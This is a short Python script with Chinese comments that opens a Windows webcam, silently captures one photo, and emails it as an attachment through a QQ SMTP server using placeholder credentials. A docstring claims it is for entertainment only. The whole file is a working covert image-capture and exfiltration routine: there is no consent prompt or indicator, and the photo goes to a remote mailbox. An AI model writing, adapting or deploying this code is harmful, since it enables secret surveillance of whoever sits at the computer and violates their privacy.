import cv2
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
"""
打开windows摄像头并拍摄照片通过邮箱发送
仅限娱乐，请勿用作其他用途
"""
def send_email():
    # 发件人和收件人的邮箱地址
    from_email = 'from_email'
    to_email = "to_email"

    # 邮件服务器的设置
    smtp_server = "smtp.qq.com"  #smtp地址
    smtp_port = 587 # 端口号
    smtp_username = "Your_email"
    smtp_password = "password"

    # 构建邮件内容
    msg = MIMEMultipart()
    msg["From"] = from_email
    msg["To"] = to_email
    msg["Subject"] = "照片"

    # 打开摄像头并拍照
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()

    if ret:
        # 将图像转换为字节流
        _, img_encoded = cv2.imencode('.jpg', frame)
        img_bytes = img_encoded.tobytes()

        # 创建邮件正文
        text = MIMEText("这是一张照片")
        msg.attach(text)

        # 创建图像附件
        image = MIMEImage(img_bytes)
        image.add_header('Content-Disposition', 'attachment', filename="photo.jpg")
        msg.attach(image)

        # 发送邮件
        try:
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.starttls()
            server.login(smtp_username, smtp_password)
            server.sendmail(from_email, to_email, msg.as_string())
            server.quit()
            print("邮件发送成功")
        except Exception as e:
            print("邮件发送失败:", str(e))
    else:
        print("无法获取摄像头图像")
if __name__ == '__main__':
    # 调用函数发送邮件
    send_email()